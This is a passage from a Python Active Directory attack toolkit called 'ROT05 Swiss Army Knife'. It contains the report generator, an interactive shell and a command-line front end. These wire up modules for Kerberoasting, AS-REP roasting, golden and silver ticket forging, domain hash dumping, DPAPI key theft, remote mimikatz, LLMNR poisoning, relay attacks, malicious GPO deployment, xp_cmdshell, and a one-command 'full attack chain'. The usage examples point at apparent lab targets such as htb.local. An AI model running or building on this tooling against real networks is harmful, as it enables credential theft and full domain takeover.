                if stdout and len(stdout) > 10:
                    warn(f"  {cve_id} - POSSIBLE VULNERABILITY")
                    results.append({
                        "cve":     cve_id,
                        "name":    vuln["name"],
                        "details": stdout[:200],
                    })
                else:
                    info(f"  {cve_id} - Not detected or patched")
            else:
                debug(f"Port {port} closed - skipping {cve_id}")

        save_output(json.dumps(results, indent=2), out_dir / "scan_results.json")

        title("Vulnerability Summary")
        if results:
            for r in results:
                print(f"{R}[!]{RST} {r['cve']} - {r['name']}")
        else:
            success("No known vulnerabilities detected")

        return results

# ──────────────────────────────────────────────────────────────────────────────
# REPORT  (single implementation — FIX #8: removed duplicate do_report())
# ──────────────────────────────────────────────────────────────────────────────

def generate_report():
    title("Generating Report")
    report_file = config.output_dir / "REPORT.txt"

    services = detect_services(config.ip) if config.ip else {}

    lines = [
        "ROT05 Assessment Report",
        "=" * 60,
        f"Target:     {config.ip}",
        f"Domain:     {config.domain}",
        f"Timestamp:  {datetime.datetime.now()}",
        "=" * 60,
        "",
        "DETECTED SERVICES:",
    ]
    lines += [f"  • {k}" for k, v in services.items() if v]

    lines += ["", "FINDINGS:"]
    findings = []

    kerb = config.output_dir / "kerberoast" / "hashes.txt"
    if kerb.exists() and kerb.stat().st_size > 0:
        findings.append("  • Kerberoastable accounts found")

    asrep = config.output_dir / "asrep" / "hashes.txt"
    if asrep.exists() and asrep.stat().st_size > 0:
        findings.append("  • AS-REP roastable accounts found")

    cpass = config.output_dir / "gpo" / "cpassword_results.txt"
    if cpass.exists() and "cpassword" in cpass.read_text().lower():
        findings.append("  • cPassword found in SYSVOL")

    lines += findings if findings else ["  No critical findings yet"]

    lines += ["", "OUTPUT FILES:"]
    for subdir in sorted(config.output_dir.iterdir()):
        if subdir.is_dir():
            lines.append(f"\n[{subdir.name.upper()}]")
            for f in sorted(subdir.iterdir()):
                lines.append(f"  {f.name}")

    lines += ["", "=" * 60]

    report_file.write_text("\n".join(lines))
    success(f"Report saved to {report_file}")

# ──────────────────────────────────────────────────────────────────────────────
# INTERACTIVE SHELL
# ──────────────────────────────────────────────────────────────────────────────

class ROT05Shell(cmd.Cmd):
    intro = f"""
{Y}═══════════════════════════════════════════════════════════════════{RST}
{B}  ROT05 Swiss Army Knife - Interactive Mode{RST}
{Y}═══════════════════════════════════════════════════════════════════{RST}

Type {G}help{RST} for commands, {G}set{RST} to configure target, {G}run{RST} to execute modules.
Type {G}exit{RST} to quit.

{Y}Quick Start:{RST}
  set target 10.10.10.10
  set domain htb.local
  set user svc_admin
  set pass Password123
  scan
  enum
  kerberoast

"""
    prompt = f"{B}ROT05>{RST} "

    def __init__(self):
        super().__init__()
        # FIX #2 – nmap wrapped in lambda so it receives config.ip at call time
        self.modules = {
            "nmap":         lambda: ADEnum.run_nmap(config.ip),
            "ldap":         ADEnum.ldap_enum,
            "smb":          ADEnum.smb_enum,
            "kerberoast":   KerberosAttacks.kerberoast,
            "asreproast":   KerberosAttacks.asreproast,
            "golden":       KerberosAttacks.golden_ticket,
            "adcs":         ADCSAttacks.enumerate_ca,
            "exch-detect":  ExchangeAttacks.detect_version,
            "privexchange": ExchangeAttacks.privesc,
            "ews":          ExchangeAttacks.ews_abuse,
            "sql-enum":     SQLAttacks.enumerate,
            "sql-cmd":      lambda: SQLAttacks.xp_cmdshell(input("Command: ")),
            "gpo-scan":     GPOAttacks.find_cpassword,
            "gpo-pwn":      GPOAttacks.malicious_gpo,
            "secrets":      CredentialAccess.secretsdump,
            "dpapi":        CredentialAccess.dpapi_backup,
            "mimikatz":     CredentialAccess.mimikatz_remote,
            "responder":    lambda: RelayAttacks.responder(60),
            "relay":        lambda: RelayAttacks.smb_relay("targets.txt"),
            "mitm6":        RelayAttacks.mitm6_attack,
            "bloodhound":   lambda: BloodHound.collect("SharpHound.exe"),
            "scan":         CVEScanner.scan,
        }

    def do_set(self, arg):
        """Set configuration: set target|domain|user|pass|hash|ca|exchange|sql|interface <value>"""
        args = arg.split(maxsplit=1)
        if len(args) != 2:
            print("Usage: set <option> <value>")
            print("Options: target, domain, user, pass, hash, ca, exchange, sql, interface")
            return

        key, value = args[0].lower(), args[1]
        mapping = {
            "target":    ("ip",              f"Target set to {value}"),
            "domain":    ("domain",          f"Domain set to {value}"),
            "user":      ("username",        f"Username set to {value}"),
            "pass":      ("password",        "Password set"),
            "hash":      ("ntlm_hash",       "NTLM hash set"),
            "ca":        ("ca_server",       f"CA server set to {value}"),
            "exchange":  ("exchange_server", f"Exchange server set to {value}"),
            "sql":       ("sql_server",      f"SQL server set to {value}"),
            "interface": ("interface",       f"Interface set to {value}"),
        }
        if key in mapping:
            attr, msg = mapping[key]
            setattr(config, attr, value)
            success(msg)
        else:
            err(f"Unknown option: {key}")

    def do_show(self, arg):
        """Show current configuration"""
        print(f"{Y}Current Configuration:{RST}")
        print(f"  Target:      {config.ip       or 'NOT SET'}")
        print(f"  Domain:      {config.domain   or 'NOT SET'}")
        print(f"  Username:    {config.username or 'NOT SET'}")
        print(f"  Password:    {'*' * len(config.password) if config.password else 'NOT SET'}")
        print(f"  NTLM Hash:   {config.ntlm_hash[:16] + '...' if config.ntlm_hash else 'NOT SET'}")
        print(f"  CA Server:   {config.ca_server       or 'NOT SET'}")
        print(f"  Exchange:    {config.exchange_server  or 'NOT SET'}")
        print(f"  SQL Server:  {config.sql_server       or 'NOT SET'}")
        print(f"  Interface:   {config.interface}")
        print(f"  Output Dir:  {config.output_dir}")

    def do_enum(self, arg):
        """Run full enumeration (nmap, ldap, smb)"""
        if not config.ip:
            err("Target not set. Use: set target <IP>")
            return

        title("Full AD Enumeration")

        if is_port_open(config.ip, 88):
            info("Kerberos detected - Domain Controller confirmed")

        for service, present in detect_services(config.ip).items():
            if present:
                success(f"{service} detected")

        ADEnum.run_nmap(config.ip)
        ADEnum.ldap_enum()
        ADEnum.smb_enum()

        if config.has_creds():
            KerberosAttacks.kerberoast()
            KerberosAttacks.asreproast()

    def do_full(self, arg):
        """Run full attack chain (all modules)"""
        if not config.ip or not config.has_creds():
            err("Target and credentials required for full attack")
            return

        self.do_enum("")
        KerberosAttacks.kerberoast()
        KerberosAttacks.asreproast()

        if config.ca_server or is_port_open(config.ip, 443):
            ADCSAttacks.enumerate_ca()

        if config.exchange_server or is_port_open(config.ip, 443):
            ExchangeAttacks.detect_version()

        if config.sql_server or is_port_open(config.ip, 1433):
            SQLAttacks.enumerate()

        CredentialAccess.secretsdump()
        CredentialAccess.dpapi_backup()
        GPOAttacks.find_cpassword()

        success("Full attack chain completed")

    def do_run(self, arg):
        """Run a specific module: run kerberoast"""
        if not arg:
            print(f"Usage: run <module>\nModules: {', '.join(self.modules.keys())}")
            return

        if arg not in self.modules:
            err(f"Unknown module: {arg}")
            return

        if not config.ip:
            err("Target not set. Use: set target <IP>")
            return

        try:
            self.modules[arg]()
        except Exception as e:
            err(f"Module failed: {e}")

    def do_shell(self, arg):
        """Execute system command: shell whoami"""
        if arg:
            _, stdout, stderr = run_cmd(arg)
            print(stdout)
            if stderr:
                print(stderr, file=sys.stderr)
        else:
            os.system(os.environ.get("SHELL", "/bin/bash"))

    # FIX #8 – delegate to the single generate_report() instead of duplicating it
    def do_report(self, arg):
        """Generate assessment report"""
        generate_report()

    def do_exit(self, arg):
        """Exit interactive mode"""
        print("Goodbye!")
        return True

    def do_help(self, arg):
        """List available commands"""
        print(f"""
{Y}Commands:{RST}
  set <opt> <val>  Configure target/domain/credentials
  show             Display current configuration
  enum             Full enumeration (nmap, ldap, smb)
  full             Complete attack chain
  run <module>     Execute specific module
  report           Generate assessment report
  shell <cmd>      Run system command
  exit             Quit

{Y}Modules:{RST}
  nmap          Network scan
  ldap          LDAP enumeration
  smb           SMB enumeration
  kerberoast    SPN hash extraction
  asreproast    AS-REP hash extraction
  golden        Golden Ticket creation
  adcs          AD CS vulnerability enum
  exch-detect   Exchange version detection
  privexchange  PrivExchange attack
  ews           EWS mailbox access
  sql-enum      SQL Server enumeration
  sql-cmd       xp_cmdshell execution
  gpo-scan      SYSVOL cPassword hunt
  gpo-pwn       Malicious GPO deployment
  secrets       Domain hash dump
  dpapi         DPAPI backup key extraction
  mimikatz      Remote credential harvest
  responder     LLMNR/NBT-NS poisoning (background)
  relay         SMB relay setup guide
  mitm6         IPv6 DNS spoofing guide
  bloodhound    BloodHound data collection
  scan          CVE vulnerability scan
""")

# ──────────────────────────────────────────────────────────────────────────────
# MAIN CLI
# ──────────────────────────────────────────────────────────────────────────────

def parse_args():
    parser = argparse.ArgumentParser(
        description="ROT05 Swiss Army Knife - Ultimate AD Pentesting Toolkit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 red_offensive_team_05.py                              # interactive
  python3 red_offensive_team_05.py -t 10.10.10.10 --enum
  python3 red_offensive_team_05.py -t DC.htb.local -d htb.local -u user -P --kerberoast
  python3 red_offensive_team_05.py -t 10.10.10.10 -d domain.local -u admin -p Pass --full
  python3 red_offensive_team_05.py -t 10.10.10.10 --scan-cves
"""
    )

    parser.add_argument("-t", "--target",          help="Target IP address")
    parser.add_argument("-d", "--domain",           help="Domain name")
    parser.add_argument("-u", "--username",         help="Username")
    parser.add_argument("-p", "--password",         help="Password")
    parser.add_argument("-P", "--prompt-password",  action="store_true",
                        help="Prompt for password (keeps it out of shell history)")
    parser.add_argument("-H", "--hash",             help="NTLM hash for PTH")

    parser.add_argument("--enum",        action="store_true", help="Run full enumeration")
    parser.add_argument("--full",        action="store_true", help="Run full attack chain")
    parser.add_argument("--kerberoast",  action="store_true", help="Kerberoasting")
    parser.add_argument("--asreproast",  action="store_true", help="AS-REP Roasting")
    parser.add_argument("--golden",      action="store_true", help="Create Golden Ticket")
    parser.add_argument("--silver",      metavar="SPN",       help="Create Silver Ticket for SPN")
    parser.add_argument("--adcs",        action="store_true", help="Enumerate AD CS")
    parser.add_argument("--exchange",    action="store_true", help="Enumerate Exchange")
    parser.add_argument("--sql",         action="store_true", help="Enumerate SQL Server")

    # FIX #5 – nargs="?" + const="" so --secrets works as a bare flag or with a username
    parser.add_argument("--secrets",  nargs="?", const="", metavar="USERNAME",
                        help="Dump hashes (optionally for a specific username)")
    parser.add_argument("--dpapi",       action="store_true", help="Extract DPAPI backup key")
    parser.add_argument("--responder",   type=int, nargs="?", const=60, metavar="SECONDS",
                        help="Run Responder in background (default 60s)")
    parser.add_argument("--scan-cves",   action="store_true", help="Scan for known CVEs")
    parser.add_argument("--bloodhound",  metavar="SHARPHOUND_PATH",
                        help="Path to SharpHound.exe for remote collection")

    parser.add_argument("--ca-server",       help="AD CS server")
    parser.add_argument("--exchange-server", help="Exchange server")
    parser.add_argument("--sql-server",      help="SQL server")
    parser.add_argument("--interface",       default="eth0", help="Network interface")
    parser.add_argument("-o", "--output",    default="rot05_output", help="Output directory")
    parser.add_argument("--interactive",     action="store_true", help="Start interactive shell")

    return parser.parse_args()


def main():
    banner()
    args = parse_args()

    # Populate global config from CLI args
    if args.target:          config.ip              = args.target
    if args.domain:          config.domain          = args.domain
    if args.username:        config.username        = args.username
    if args.password:        config.password        = args.password
    if args.hash:            config.ntlm_hash       = args.hash
    if args.ca_server:       config.ca_server       = args.ca_server
    if args.exchange_server: config.exchange_server = args.exchange_server
    if args.sql_server:      config.sql_server      = args.sql_server
    if args.interface:       config.interface       = args.interface
    if args.output:          config.output_dir      = Path(args.output)

    config.output_dir.mkdir(parents=True, exist_ok=True)

    if args.prompt_password and not config.password and config.username:
        config.password = getpass(f"Password for {config.username}@{config.domain}: ")

    if args.interactive or not args.target:
        ROT05Shell().cmdloop()
        return

    info(f"Target: {config.ip}")
    info(f"Output: {config.output_dir}")

    if args.scan_cves:
        CVEScanner.scan()

    if args.enum or args.full:
        ADEnum.run_nmap(config.ip)
        ADEnum.ldap_enum()
        ADEnum.smb_enum()

    if args.kerberoast or args.full:
        KerberosAttacks.kerberoast()

    if args.asreproast or args.full:
        KerberosAttacks.asreproast()

    if args.golden or args.full:
        KerberosAttacks.golden_ticket()

    if args.silver:
        KerberosAttacks.silver_ticket(args.silver)

    if args.adcs or args.full:
        if config.has_creds():
            ADCSAttacks.enumerate_ca()
        else:
            err("AD CS enumeration requires credentials")

    if args.exchange or args.full:
        ExchangeAttacks.detect_version()
        if config.has_creds():
            ExchangeAttacks.ews_abuse()

    if args.sql or args.full:
        SQLAttacks.enumerate()

    if args.secrets is not None or args.full:
        if config.has_creds():
            target_user = args.secrets if args.secrets else ""
            CredentialAccess.secretsdump(target_user)
        else:
            err("Secrets dump requires credentials")

    if args.dpapi or args.full:
        if config.has_creds():
            CredentialAccess.dpapi_backup()
        else:
            err("DPAPI extraction requires credentials")

    if args.responder:
        RelayAttacks.responder(args.responder)

    if args.bloodhound:
        BloodHound.collect(args.bloodhound)

    generate_report()
    success(f"Done! Results saved to {config.output_dir}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Interrupted by user{RST}")
        sys.exit(0)
    except Exception as e:
        err(f"Fatal error: {e}")
        sys.exit(1)
